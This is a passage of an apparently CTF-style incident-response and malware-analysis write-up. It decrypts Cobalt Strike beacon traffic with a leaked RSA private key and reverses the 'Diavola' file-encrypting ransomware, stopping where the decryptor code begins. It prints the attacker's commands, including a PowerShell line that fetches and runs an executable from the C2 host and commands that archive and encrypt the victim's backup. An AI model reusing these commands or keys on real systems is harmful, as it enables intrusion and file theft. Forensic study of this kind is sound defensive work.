(30820276020100300d06092a864886f70d0101010500048202603082025c02010002818100a738cde75f1fbb1c18646c377e03016b162b12ba72bdf7dc36b4cd2e4e9bae12205a95c26170bf908105ad7fa4bbccfa798632261bed9870f975f20794e1fe499523d71f08a56cae0315bfde3d6c8a16386b03b7a6551aa1336d50325a3500db27d78ad8fd13b6a73b9fb7c3fb4d7a088e323f07618656ecd83595fa5f823613020301000102818059eb70c54ee078341665c1cf61426a7bd412db62491b1ff259b48574b62e7ebf1e88b7692c0e7de44d8ce90bef60514c0b16ff5680c415aa026acaf80ab62f8f30698c7132530ddd46a44b7777387037312e49c59dc5a00e20967435f74cac6703a201ec3431b86008e0d973fa775799bc7b8863037270a33829c081e6cbaa11024100e25d4778e0d1e1e5cb65be3836f5d64af06d054ec6e3b03f78f6bde89ef2d9e4b932b735fc264a5c7a3d2a7c66d00187c3dca51c3ef758fdfde70564c1c2e8e9024100bd1d5576d0e8569d711d5aca42fd808c1f7085c5ced215180360adabd6c553414fdf4ccd9b91d6995c35886636cb14e6f453bff341f56cbae67218c17077099b0240620f127514bf16e29af7da2d33f1cf00eba1ee98afa3d6a7c858eaefa85b7f748b9da2ac2a2cd42db76e63c73c2a835f32c3946ae603f47322d83f07e4bff07102402d2e19e1e5ecebec773ea51717440af6eef7e9eda50889a3900303dabed7ab9939e4c62b84d425a9c3dec2347138b948a7ec6e3a4672c4c42e13ea1824af3bab024100bd154581c5d399c838f476b75482886fcdf194d8419d6564a8dc8b9c074e044359519e3bf6868fc3b4a5f8dd120f5e53813db9fb83fa3ca1fc404ea1c02fe0e5)
0x0008 server,get-uri                   0x0003 0x0100 'divanodivino.xyz,/dot.gif'
0x0043 DNS_STRATEGY                     0x0001 0x0002 0
0x0044 DNS_STRATEGY_ROTATE_SECONDS      0x0002 0x0004 -1
0x0045 DNS_STRATEGY_FAIL_X              0x0002 0x0004 -1
0x0046 DNS_STRATEGY_FAIL_SECONDS        0x0002 0x0004 -1
0x000e SpawnTo                          0x0003 0x0010 (NULL ...)
0x001d spawnto_x86                      0x0003 0x0040 '%windir%\\syswow64\\rundll32.exe'
0x001e spawnto_x64                      0x0003 0x0040 '%windir%\\sysnative\\rundll32.exe'
0x001f CryptoScheme                     0x0001 0x0002 0
0x001a get-verb                         0x0003 0x0010 'GET'
0x001b post-verb                        0x0003 0x0010 'POST'
0x001c HttpPostChunk                    0x0002 0x0004 0
0x0025 license-id                       0x0002 0x0004 0 trial or pirated? - Stats uniques -> ips/hostnames: 740 publickeys: 448
0x0026 bStageCleanup                    0x0001 0x0002 0
0x0027 bCFGCaution                      0x0001 0x0002 0
0x0009 useragent                        0x0003 0x0100 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)'
0x000a post-uri                         0x0003 0x0040 '/submit.php'
0x000b Malleable_C2_Instructions        0x0003 0x0100
  Transform Input: [7:Input,4]
   Print
0x000c http_get_header                  0x0003 0x0200
  Build Metadata: [7:Metadata,3,6:Cookie]
   BASE64
   Header Cookie
0x000d http_post_header                 0x0003 0x0200
  Const_header Content-Type: application/octet-stream
  Build SessionId: [7:SessionId,5:id]
   Parameter id
  Build Output: [7:Output,4]
   Print
0x0036 HostHeader                       0x0003 0x0080 (NULL ...)
0x0032 UsesCookies                      0x0001 0x0002 1
0x0023 proxy_type                       0x0001 0x0002 2 IE settings
0x003a TCP_FRAME_HEADER                 0x0003 0x0080 '\x00\x04'
0x0039 SMB_FRAME_HEADER                 0x0003 0x0080 '\x00\x04'
0x0037 EXIT_FUNK                        0x0001 0x0002 0
0x0028 killdate                         0x0002 0x0004 0
0x0029 textSectionEnd                   0x0002 0x0004 0
0x002b process-inject-start-rwx         0x0001 0x0002 64 PAGE_EXECUTE_READWRITE
0x002c process-inject-use-rwx           0x0001 0x0002 64 PAGE_EXECUTE_READWRITE
0x002d process-inject-min_alloc         0x0002 0x0004 0
0x002e process-inject-transform-x86     0x0003 0x0100 (NULL ...)
0x002f process-inject-transform-x64     0x0003 0x0100 (NULL ...)
0x0035 process-inject-stub              0x0003 0x0010 (NULL ...)
0x0033 process-inject-execute           0x0003 0x0080 '\x01\x02\x03\x04'
0x0034 process-inject-allocation-method 0x0001 0x0002 0
0x0000
Guessing Cobalt Strike version: 4.3 (max 0x0046)
Sanity check Cobalt Strike config: OK
.......................................

```
It identifies the beacon payload type as `reverse HTTP` on port 80, with a sleeptime of 60 seconds. The beacon connects to the server at `divanodivino.xyz` with the URI ``/dot.gif``. The guessed Cobalt Strike version is 4.3, and it has a known private key.

`/dot.gif` has `GET` request `cookie` value. Checking one `GET` request from `incident` file with wireshark, and this `Cookie` value seems like `base64`:<br>
```bash
GET /dot.gif HTTP/1.1
Accept: */*
Cookie: iG36xdqmsvZYrNKtj/uu9HemTtxPIuoFRNPYiOgdPDERcX6UCIokAUFNka3JtV8xOF5ZksJ5PkFV55a2Hsa3YerVjygjy9RdcjybsbPX7HtJkQ2/Ot8W+G270PcC2i9BEkvQzqFDM00C1HeXdP6RHltJjUHtFYtAYIM5GnbQXY0=
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)
Host: divanodivino.xyz
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Sat, 31 Aug 2024 13:17:13 GMT
Content-Type: application/octet-stream
Content-Length: 0
```

For now, lets try to decrypt metadata with this `Cookie` value using `cs-decrypt-metadat.py`:
```bash
python cs-decrypt-metadata/cs-decrypt-metadata.py iG36xdqmsvZYrNKtj/uu9HemTtxPIuoFRNPYiOgdPDERcX6UCIokAUFNka3JtV8xOF5ZksJ5PkFV55a2Hsa3YerVjygjy9RdcjybsbPX7HtJkQ2/Ot8W+G270PcC2i9BEkvQzqFDM00C1HeXdP6RHltJjUHtFYtAYIM5GnbQXY0=
Encrypted metadata: iG36xdqmsvZYrNKtj/uu9HemTtxPIuoFRNPYiOgdPDERcX6UCIokAUFNka3JtV8xOF5ZksJ5PkFV55a2Hsa3YerVjygjy9RdcjybsbPX7HtJkQ2/Ot8W+G270PcC2i9BEkvQzqFDM00C1HeXdP6RHltJjUHtFYtAYIM5GnbQXY0=
Decrypted:
Header: 0000beef
Datasize: 0000005d
Raw key:  a04a96434271b4c3f7e13251e6b38286
 aeskey:  e3efe1d3d2a5a62d227f6e79d6274709
 hmackey: b05af606325cc51bda4780a83006d58b
charset: 04e4 ANSI Latin 1; Western European (Windows)
charset_oem: 01b5 OEM United States
bid: 639c4376 1671185270
pid: 1754 5972
port: 0
flags: 0e
var1: 6
var2: 2
var3: 9200
var4: 32762
var5: 3471176640
var6: 3471159760
var7: 1160396900
Field: bytearray(b'ARMAND-PC')
Field: bytearray(b'armand')
Field: bytearray(b'maksamakkara_ohje.pdf.exe')
```

Alright, seems like we now have `raw key`. We can use this key to decrypt this C2 traffic from `incident.pcapng` file using `cs-parse-http-traffic.py` with `-r` flag which will be this raw key we just found, also using some filterin with `-y` flag to get only C2 traffic:
```
cs-parse-traffic.py incident.pcapng -o parsed_traffic -Y 'ip.addr == 100.64.13.37' -r a04a96434271b4c3f7e13251e6b38286
```
This will create `parsed_traffic` file after done.

Investigating parsed traffic we got:

```
Packet number: 1982
HTTP response (for request 1869 GET)
Length raw data: 157248
Timestamp: 1725110325 20240831-131845
Data size: 157208
Command: 10 COMMAND_UPLOAD
 Arguments length: 157200
 b'\x00\x00\x00\x0cPizzaBox.exeMZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00
 MD5: 721ac7ac9757c3665d9bbea6c74bde53
 ```

This packet seems to download some file `PizzaBox` and right after this it executes some command:

```
Packet number: 2446
HTTP response (for request 2443 GET)
Length raw data: 400
Timestamp: 1725110343 20240831-131903
Data size: 375
Command: 78 COMMAND_EXECUTE_JOB
 Command: b''
 Arguments: b'powershell -nop -exec bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvAGQAaQB2AGEAbgBvAGQAaQB2AGkAbgBvAC4AeAB5AHoAOgA4ADAAOAAwAC8AcwB2AGMAaABvAHMAdAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABVAHMAZQByAHMAXABBAHIAbQBhAG4AZABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAUABpAHoAegBhAEIAbwB4AC4AZQB4AGUA'
 Integer: 1
```
This `EncodedCommand` is `Base64` string, so decoding it:
```
echo -n "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvAGQAaQB2AGEAbgBvAGQAaQB2AGkAbgBvAC4AeAB5AHoAOgA4ADAAOAAwAC8AcwB2AGMAaABvAHMAdAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABVAHMAZQByAHMAXABBAHIAbQBhAG4AZABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAUABpAHoAegBhAEIAbwB4AC4AZQB4AGUA" | base64 -d
```
Outputs:
```
Invoke-WebRequest "http://divanodivino.xyz:8080/svchost.exe" -OutFile C:\Users\Armand\AppData\Local\Temp\PizzaBox.exe 
```

Seems like this downloads this `svchost.exe` file what we already saw in `pcap` traffic. 
Moving on there is execution of this file:
```
Packet number: 2650
HTTP response (for request 2647 GET)
Length raw data: 96
Timestamp: 1725110351 20240831-131911
Data size: 60
Command: 78 COMMAND_EXECUTE_JOB
 Command: b''
 Arguments: b'PizzaBox.exe --bake --key KouvostonMakkara'
 Integer: 0
```
This executes this certain exe that just downloaded on victim and then sends back response:

```
Packet number: 2657
HTTP request POST
http://divanodivino.xyz/submit.php?id=1671185270
Length raw data: 68
Counter: 9
Callback: 30 CALLBACK_OUTPUT_OEM
Pizza per te: Diavola.exe
```

Next new command:
```
Packet number: 2792
HTTP response (for request 2789 GET)
Length raw data: 80
Timestamp: 1725110362 20240831-131922
Data size: 55
Command: 78 COMMAND_EXECUTE_JOB
 Command: b''
 Arguments: b'Diavola.exe -d C:\\Users\\Armand\\backup'
 Integer: 0
```

And the response:
```
Packet number: 2864
HTTP request POST
http://divanodivino.xyz/submit.php?id=1671185270
Length raw data: 548
Counter: 10
Callback: 30 CALLBACK_OUTPUT_OEM
Encrypting file: C:\Users\Armand\backup\daddy_front_of_office.jpeg
Encrypting file: C:\Users\Armand\backup\defcon_trip.jpeg
Encrypting file: C:\Users\Armand\backup\dickpick.jpeg
Encrypting file: C:\Users\Armand\backup\dont_waste_your_time_here.jpeg
Encrypting file: C:\Users\Armand\backup\games_in_vegas.jpeg
Encrypting file: C:\Users\Armand\backup\sausage.pdf
Encrypting file: C:\Users\Armand\backup\snack_in_pattaya.jpeg
Encrypting file: C:\Users\Armand\backup\Thunderbird_profile_backup.zip
```


This suggests PizzaBox.exe is used to encrypt files on the victim's system. 
After encryption, files has been arhived with password:
```
Packet number: 3287
HTTP response (for request 3284 GET)
Length raw data: 272
Timestamp: 1725110388 20240831-131948
Data size: 239
Command: 78 COMMAND_EXECUTE_JOB
 Command: b''
 Arguments: b'powershell -nop -exec bypass -EncodedCommand NwB6ACAAYQAgAGEALgA3AHoAIAAtAHAASwBvAHUAdgBvAHMAdABvAG4ATQBhAGsAawBhAHIAYQBHAG8AdABQAHcAbgBlAGQATABvAGwAWABEACAAIgBDADoAXABVAHMAZQByAHMAXABhAHIAbQBhAG4AZABcAGIAYQBjAGsAdQBwACIA'
 Integer: 1
```
Decrypted command:
```
7z a a.7z -pKouvostonMakkaraGotPwnedLolXD "C:\Users\armand\backup" 
```
So now we have also password for this archive.


Beacon traffic got one more interesting part:
```
Packet number: 9551
HTTP response (for request 9547 GET)
Length raw data: 1888
Timestamp: 1725110531 20240831-132211
Data size: 1859
Command: 78 COMMAND_EXECUTE_JOB
 Command: b''
 Arguments: b'powershell -nop -exec bypass -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIATQBtAEUAMQBaAGoAVgBsAE0AagBBADEATgBUAGMAeQBOAG0ATQB5AE0ARABZADMATgB6AFUAMwBNAGoAWQAxAE4AegBJAHkATQBUAEkAdwBOAFcAVQAxAFoAagBKAGgATQBHAFEAdwBZAFQAQgBrAE0ARwBFADEATgBqAGMAegBNAGoAQQAyAFkAegBZAHkATgBqAGcAeQBNAEQAYwB4AE4AagBJADIATQBUAEkAMwBOAGoAYwB5AE0ARABZAHoATgBtAFUAMgBZAHoASQB3AE4AagBjADMATgBUAGMAeQBNAGoAQQAyAE4AVABaAGwATgBqAEUAMgBOAGoAWQB5AE4AMgBFAHkAWQB6AEkAdwBOAG0ARQAzAE0AagBJAHcATgBtAEUAMwBOAGoAYwA1AE4AegBrAHkATQBEAFkAMQBOAHoASQAzAE8AVABjAHkATgBtAFUAMgBOAGoAYwB5AE0AagBBADIATgB6AGMAMQBOAHoASQB5AE0ARABjAHkATgBtAEkAMwBNAHoAYwAyAE4AegBrADIATgB6AFkAMQBOAG0AVQAyAE4AegBjAHkATgB6AEUAeQBNAEQATQAzAE4AbQBRAHkATQBEAGMAegBOAHoAWQAzAE8AVABjAHkATQBqAEEAMgBNAGoAWQB4AE0AagBBADIATQBqAFkANABOAGoAVQB5AE0ARABjADUATgB6AEkAMgBaAFQAYwA0AE4AagBZADMATgBqAFkAMwBOAHoASQB5AE0ARABZAHkATgBqAEUAeQBNAEQATQB5AE0AegBBAHoATQBqAE0AMABNAG0AUQB6AE0ARABNADUATQBtAFEAegBNAEQATQB5AE4ARABjAHoATQBUAE0AMQBNAHoAQQB6AE0ARABSAGsATQBtAFUAdwBaAEQAQgBoAE0ARwBRAHcAWQBUAFEANQBOAHoAWQAyAE4AagBjADIATgBqAGMAeQBNAEQAWQB5AE4AagBnADIATgBUAEkAdwBOAGoAWQAzAE4AagBZADMATgB6AEkAegBZAFQAQgBrAE0ARwBFADMATgBUAFkAMwBOAGoAYwAyAE0AegBZADIATQAyAEUAeQBaAGoASgBtAE4AbQBFADIAWgBUAGMANQBOAHoAawB5AFoAVABZAHkATgB6AE0AeQBaAFQAWQAyAE4AegBVADMATQBqAGMAeQBOAGoATQAyAE4AagBKAGwATgB6AEUAMwBOAGoAWQA1AE4AbQBVADIATQBUAFkAeQBOAHoARQAzAE4AagBZADUATgB6AFkAMgBNAFQAWQB5AE0AbQBVADIAWQBqAFoAagBOAG0AUQB5AFoAagBjADQATgBqAEkAMgBPAEQAWQA1AE4AagBJADIATgBqAFkAMwBOAGoASQAyAE0AVABkAGgATgBtAFUAMwBPAEQAYwA0AE4AbQBVADIATgBUAFoAbABNAEcAUQB3AFkAVABCAGsATQBHAEUAMQBaAFQAVgBtAE0AbQBFAHkATQBEAFEAeABOAGoASQAyAE4AegBjADEATgB6AFkAMgBNAFQAYwAwAE0AagBBADIATQB6AGMAeQBOAGoAVQAyAE4AagBZAHkATgBqAEUAMgBaAFQAYwA1AE0AbQBNAHkATQBEAGMAMwBOAGoAZwAyAE4AagBZADMATQBqAEEAMgBaAGoAWQA0AE4AagBZADMATgBqAFkAeABOAHoASQAyAE4AagBZADIATQBqAEEAeQBZAFQAVgBtAE4AVwBVAD0AIgA='
 Integer: 1
```
Decoding payload with base64:
```
VwByAGkAdABlAC0ASABvAHMAdAAgACIATQBtAEUAMQBaAGoAVgBsAE0AagBBADEATgBUAGMAeQBOAG0ATQB5AE0ARABZADMATgB6AFUAMwBNAGoAWQAxAE4AegBJAHkATQBUAEkAdwBOAFcAVQAxAFoAagBKAGgATQBHAFEAdwBZAFQAQgBrAE0ARwBFADEATgBqAGMAegBNAGoAQQAyAFkAegBZAHkATgBqAGcAeQBNAEQAYwB4AE4AagBJADIATQBUAEkAMwBOAGoAYwB5AE0ARABZAHoATgBtAFUAMgBZAHoASQB3AE4AagBjADMATgBUAGMAeQBNAGoAQQAyAE4AVABaAGwATgBqAEUAMgBOAGoAWQB5AE4AMgBFAHkAWQB6AEkAdwBOAG0ARQAzAE0AagBJAHcATgBtAEUAMwBOAGoAYwA1AE4AegBrAHkATQBEAFkAMQBOAHoASQAzAE8AVABjAHkATgBtAFUAMgBOAGoAYwB5AE0AagBBADIATgB6AGMAMQBOAHoASQB5AE0ARABjAHkATgBtAEkAMwBNAHoAYwAyAE4AegBrADIATgB6AFkAMQBOAG0AVQAyAE4AegBjAHkATgB6AEUAeQBNAEQATQAzAE4AbQBRAHkATQBEAGMAegBOAHoAWQAzAE8AVABjAHkATQBqAEEAMgBNAGoAWQB4AE0AagBBADIATQBqAFkANABOAGoAVQB5AE0ARABjADUATgB6AEkAMgBaAFQAYwA0AE4AagBZADMATgBqAFkAMwBOAHoASQB5AE0ARABZAHkATgBqAEUAeQBNAEQATQB5AE0AegBBAHoATQBqAE0AMABNAG0AUQB6AE0ARABNADUATQBtAFEAegBNAEQATQB5AE4ARABjAHoATQBUAE0AMQBNAHoAQQB6AE0ARABSAGsATQBtAFUAdwBaAEQAQgBoAE0ARwBRAHcAWQBUAFEANQBOAHoAWQAyAE4AagBjADIATgBqAGMAeQBNAEQAWQB5AE4AagBnADIATgBUAEkAdwBOAGoAWQAzAE4AagBZADMATgB6AEkAegBZAFQAQgBrAE0ARwBFADMATgBUAFkAMwBOAGoAYwAyAE0AegBZADIATQAyAEUAeQBaAGoASgBtAE4AbQBFADIAWgBUAGMANQBOAHoAawB5AFoAVABZAHkATgB6AE0AeQBaAFQAWQAyAE4AegBVADMATQBqAGMAeQBOAGoATQAyAE4AagBKAGwATgB6AEUAMwBOAGoAWQA1AE4AbQBVADIATQBUAFkAeQBOAHoARQAzAE4AagBZADUATgB6AFkAMgBNAFQAWQB5AE0AbQBVADIAWQBqAFoAagBOAG0AUQB5AFoAagBjADQATgBqAEkAMgBPAEQAWQA1AE4AagBJADIATgBqAFkAMwBOAGoASQAyAE0AVABkAGgATgBtAFUAMwBPAEQAYwA0AE4AbQBVADIATgBUAFoAbABNAEcAUQB3AFkAVABCAGsATQBHAEUAMQBaAFQAVgBtAE0AbQBFAHkATQBEAFEAeABOAGoASQAyAE4AegBjADEATgB6AFkAMgBNAFQAYwAwAE0AagBBADIATQB6AGMAeQBOAGoAVQAyAE4AagBZAHkATgBqAEUAMgBaAFQAYwA1AE0AbQBNAHkATQBEAGMAMwBOAGoAZwAyAE4AagBZADMATQBqAEEAMgBaAGoAWQA0AE4AagBZADMATgBqAFkAeABOAHoASQAyAE4AagBZADIATQBqAEEAeQBZAFQAVgBtAE4AVwBVAD0AIgA=
```
Another base64 but this gives even more so let's pass this to the cyberchef. Pretty straight forward: base64, hex and rot13 we get:
![New address](./pix/wallofsheepsuri.png)<br>
New address: `https://wall.of.sheeps.divanodivino.xyz/kouvostonmakkara/` but this gave `Forbidden 403`, taking `kouvostomakkara` from uri we get to the home page:
![DivanoDivino](./pix/divanodivinopage.png)<br>
And here we get to download the zip file which contain encrypted files. 

Now we have zip which should hold encrypted files and password for it, so now we can extract files from it:
```
7z x confidential.7z -pKouvostonMakkaraGotPwnedLolXD
```
And so we got encrypted files:
```bash
$ ls -la
total 43400
drwxrwxr-x 2 jubinblack jubinblack     4096 Sep 17 10:16 .
drwxrwxr-x 6 jubinblack jubinblack     4096 Sep 17 10:15 ..
-rwxrw-rw- 1 jubinblack jubinblack   898464 Feb 14  2025 daddy_front_of_office.jpeg.diavola
-rwxrw-rw- 1 jubinblack jubinblack  1132256 Feb 14  2025 defcon_trip.jpeg.diavola
-rwxrw-rw- 1 jubinblack jubinblack   206656 Feb 14  2025 dickpick.jpeg.diavola
-rwxrw-rw- 1 jubinblack jubinblack   333504 Feb 14  2025 dont_waste_your_time_here.jpeg.diavola
-rwxrw-rw- 1 jubinblack jubinblack   992304 Feb 14  2025 games_in_vegas.jpeg.diavola
-rwxrw-rw- 1 jubinblack jubinblack    30432 Feb 14  2025 sausage.pdf.diavola
-rwxrw-rw- 1 jubinblack jubinblack  1239008 Feb 14  2025 snack_in_pattaya.jpeg.diavola
-rwxrw-rw- 1 jubinblack jubinblack 39578864 Feb 14  2025 Thunderbird_profile_backup.zip.diavola

```


## Malware reverse
Let's export this `svchost.exe` which was used to create new exe with wireshark and try executing it in an isolated environment to observe if it produces similar behavior.<br>
![Diavola exe](./pix/diavolaexe.png)<br>
And so it seems that it has created new exe for us.

This is something that I won't execute since it seems to encrypt files, so this needs to be reversed first but according to traffic we just analysed, it seems to encrypt directory. So lets create dummy directory and some text files in it. 

So let's open this with `x64dbg` and `ghidra`.

Analysing this via `Ghidra`, there's lots of lines what hard quite hard to read as it is. But for what we can see from here, is that this loads Libraries at run time, also there is `Virtual protect` called on same loop in function at address `0x14000d0c7`. 
```
            uStack_20 = 0x14000d186;
            VirtualProtect(local_res8[0] + -0x400,0x1000,4,(PDWORD)local_res8);
            *(byte *)((longlong)local_res8[0] + -0xdc1) =
                 *(byte *)((longlong)local_res8[0] + -0xdc1) & 0x7f;
            *(byte *)((longlong)local_res8[0] + -0xd99) =
                 *(byte *)((longlong)local_res8[0] + -0xd99) & 0x7f;
            uStack_20 = 0x14000d1a4;
            VirtualProtect(local_res8[0] + -0x400,0x1000,0,(PDWORD)local_res8);
            puVar13 = &stack0x00000030;
            do {
              puVar14 = puVar13 + -8;
              *(undefined8 *)(puVar13 + -8) = 0;
              puVar13 = puVar13 + -8;
            } while (puVar14 != local_50);
                    /* WARNING: Bad instruction - Truncating control flow here */
            halt_baddata();
          }
          ppFVar11 = (FARPROC *)((ulonglong)puVar17[1] + (longlong)local_res8[0]);
          puVar19 = puVar17 + 2;
          uStack_20 = 0x14000d0e5;
          hModule = LoadLibraryA((LPCSTR)((ulonglong)*puVar17 + 0xe34c + (longlong)local_res8[0]));
          while( true ) {
            RSI_shti = *(byte *)puVar19;
            puVar17 = (uint *)((longlong)puVar19 + 1);
            if (RSI_shti == 0) break;
            if ((char)RSI_shti < '\0') {
              puVar17 = (uint *)(ulonglong)*(ushort *)puVar17;
              puVar19 = (uint *)((longlong)puVar19 + 3);
            }
            else {
```
This indicates that there might be some "new code" created during execution. 
Let's grap entry point from this and check debugger.

So this executables `Main` function gets called from `0xCF8B`. This is propably just some initializing stuff and more after loading libraries and setuping virtual protection:
```
..........
00007FF77BDCD0DF | FF15 FB230000            | call qword ptr ds:[<LoadLibraryA>]      |
00007FF77BDCD0E5 | 48:95                    | xchg rbp,rax                            | rax:EntryPoint
00007FF77BDCD0E7 | 8A07                     | mov al,byte ptr ds:[rdi]                | rdi:sub_7FF77BDC1000
00007FF77BDCD0E9 | 48:FFC7                  | inc rdi                                 | rdi:sub_7FF77BDC1000
.........
00007FF77BDCD106 | 48:89E9                  | mov rcx,rbp                             |
00007FF77BDCD109 | FF15 E1230000            | call qword ptr ds:[<GetProcAddress>]    | 
00007FF77BDCD10F | 48:09C0                  | or rax,rax                              | rax:EntryPoint
00007FF77BDCD112 | 74 09                    | je <JMP.&ExitProcess>                   |
...........
00007FF77BDCD157 | 48:83C7 02               | add rdi,2                               | rdi:sub_7FF77BDC1000
00007FF77BDCD15B | EB E1                    | jmp diavola.7FF77BDCD13E                |
.....................
```

Let this loop get trough and see if we got something more in here.

After it's done looping all those libs `RIP` points to `0xD1BC` and about to jump `0x1F40`. Checking if there is something more added on code and from `0x14D0` there seems to be encryption:
```
00007FF77BDC14D0 | 40:55                    | push rbp                                | Encryption entry
00007FF77BDC14D2 | 53                       | push rbx                                |
................................................
00007FF77BDC1513 | 33D2                     | xor edx,edx                             |
00007FF77BDC1515 | FF15 F51A0000            | call qword ptr ds:[<&CryptAcquireContex |
00007FF77BDC151B | 85C0                     | test eax,eax                            |
00007FF77BDC151D | 0F84 01010000            | je diavola.7FF77BDC1624                 |
00007FF77BDC1523 | 48:8B4D D8               | mov rcx,qword ptr ss:[rbp-28]           | rcx:ZwProtectVirtualMemory+14
................................................
00007FF77BDC1536 | BA 0C800000              | mov edx,800C                            |
00007FF77BDC153B | FF15 DF1A0000            | call qword ptr ds:[<&CryptCreateHash>]  |
................................................
00007FF77BDC1556 | 48:8BD3                  | mov rdx,rbx                             |
00007FF77BDC1559 | FF15 D91A0000            | call qword ptr ds:[<&CryptHashData>]    |
................................................
00007FF77BDC157B | 48:894424 20             | mov qword ptr ss:[rsp+20],rax           |
00007FF77BDC1580 | FF15 BA1A0000            | call qword ptr ds:[<&CryptDeriveKey>]   |
................................................
00007FF77BDC1598 | BA 01000000              | mov edx,1                               |
00007FF77BDC159D | FF15 8D1A0000            | call qword ptr ds:[<&CryptSetKeyParam>] |
```
Placing breakpoint on top of this but never hit it before executable crash, so there must be some sort of checking here.

At `0x19EB`, there is some IP address and url: `https://pineapple.belongs.to.pizza.divanodivino.xyz/` which is some funny meme again. This IP address is tested with `test RAX, RAX` if its zero but since it holds IP address, and next instruction is `JNE` this jump will happen. I tested this with skipping this part and let it execute further.

```
00007FF77BDC19CB | 66:8338 2D               | cmp word ptr ds:[rax],2D                | rax:"94.237.76.153", 2D:'-'
00007FF77BDC19CF | 0F85 7A020000            | jne diavola.7FF77BDC1C4F                |
00007FF77BDC19D5 | 66:8378 02 64            | cmp word ptr ds:[rax+2],64              | rax+02:".237.76.153", 64:'d'
00007FF77BDC19DA | 0F85 6F020000            | jne diavola.7FF77BDC1C4F                |
00007FF77BDC19E0 | 66:8378 04 00            | cmp word ptr ds:[rax+4],0               | rax+04:"37.76.153"
00007FF77BDC19E5 | 0F85 64020000            | jne diavola.7FF77BDC1C4F                |
00007FF77BDC19EB | 48:8D0D 1E280000         | lea rcx,qword ptr ds:[<sub_7FF77BDC4210 | 00007FF77BDC4210:"pineapple.belongs.to.pizza.divanodivino.xyz"
00007FF77BDC19F2 | E8 E9F9FFFF              | call <diavola.sub_7FF77BDC13E0>         |
00007FF77BDC19F7 | 48:85C0                  | test rax,rax                            | rax:"94.237.76.153"
00007FF77BDC19FA | 0F85 78020000            | jne diavola.7FF77BDC1C78                | skip this
00007FF77BDC1A00 | 48:89B424 C0020000       | mov qword ptr ss:[rsp+2C0],rsi          |
00007FF77BDC1A08 | 33C9                     | xor ecx,ecx                             |
```

Very next comes more interesting code: calling `rand`, `setSeed` & `getTime`. All this is usually used for random generator to set particular seed.


```
00007FF77BDC1A12 | 48:8B7B 10               | mov rdi,qword ptr ds:[rbx+10]           | rdi:&L"ACSetupSvcPort=23210", [rbx+10]:L"C:\\Downloads\\kkkk"
00007FF77BDC1A16 | E8 930F0000              | call <JMP.&_time32>                     | Get time32
00007FF77BDC1A1B | 41:B9 18000000           | mov r9d,18                              |
..........................................
00007FF77BDC1A55 | FF15 5D180000            | call qword ptr ds:[<sub_7FF77BDC32B8>]  | set seed to rand
00007FF77BDC1A5B | 33ED                     | xor ebp,ebp                             |
00007FF77BDC1A5D | 8BDD                     | mov ebx,ebp                             |
00007FF77BDC1A5F | 90                       | nop                                     |
00007FF77BDC1A60 | FF15 5A180000            | call qword ptr ds:[<&rand>]             | First random
00007FF77BDC1A66 | 25 FF000080              | and eax,800000FF                        |
........................................
00007FF77BDC1A76 | 88441C 60                | mov byte ptr ss:[rsp+rbx+60],al         |
00007FF77BDC1A7A | 48:FFC3                  | inc rbx                                 | rbx:&L"C:\\Downloads\\Diavola.exe"
00007FF77BDC1A7D | 48:83FB 20               | cmp rbx,20                              | This gets looped 0x20 (32) times
00007FF77BDC1A81 | 7C DD                    | jl diavola.7FF77BDC1A60                 |
00007FF77BDC1A83 | 48:8BDD                  | mov rbx,rbp                             |
00007FF77BDC1A86 | FF15 34180000            | call qword ptr ds:[<&rand>]             | Another random
00007FF77BDC1A8C | 25 FF000080              | and eax,800000FF                        | And operator
00007FF77BDC1A91 | 7D 09                    | jge diavola.7FF77BDC1A9C                | If its less than 0
00007FF77BDC1A93 | FFC8                     | dec eax                                 | Decrease value by 1
00007FF77BDC1A95 | 0D 00FFFFFF              | or eax,FFFFFF00                         | OR operator
00007FF77BDC1A9A | FFC0                     | inc eax                                 | Increase value by 1
00007FF77BDC1A9C | 88441C 50                | mov byte ptr ss:[rsp+rbx+50],al         |
00007FF77BDC1AA0 | 48:FFC3                  | inc rbx                                 |
00007FF77BDC1AA3 | 48:83FB 10               | cmp rbx,10                              | This gets looped 0x10 (16) times
00007FF77BDC1AA7 | 7C DD                    | jl diavola.7FF77BDC1A86                 |
```
These `rand` values goes trough `AND` operator with value `0x800000FF` and if this value is less than `0`, its value will be decreased by one, `OR` instruction with value `0xFFFFFF00` and again increase value by `1`.


Now let's go checking encryption logic from `0x14D0`, breakpointin all `crypt*` calls here, we can check what arguments are used to init encryption here.
([Microsoft](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/) link for good resource on this).

For `CryptAcquireContextW` important to get from here is `dwProvType`, this specifies the type of provider to acquire. This uses `0x18` which is `RSA_AES`.

`CryptCreateHash` we need `ALG_ID` from debugger which seems to be `0x800c` (`CALG_SHA_256`).

`CryptHashData`, here the rand generator comes to play. In debugger there was this `getTime32` whichs is placed as seed and then calling `rand` for 32 times for first one and 16 on second. This apperently takes this first rand sequence. From debugger we can see that arguments what this uses:
 - CPCreateHash 
 - pdData (this is the random generated data). Debugger this points to memory address which can be confirmed during `rand loop` that values are stored there.
 - Length of pdData (same as rounds on rand loop: `0x20` (32))

`CryptDeriveKey` uses also `ALG_ID` which in this case is `0x6610` (`CALG_AES_256`)

`CryptSetKeyParam` for the last, dwParam I copied second param which was `1` and now the other `rand loop` which was 16 (`0x10`)times. On debugger, this memory address was placed for third argument for `pdData`.

Now we should know all bits for encryption part and what comes for decryption, this same code is capable to decrypt it.

Writing decrypter with `c++`:
<details>
<summary>Reveal code</summary>

```cpp
#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <vector>
#include <iomanip>
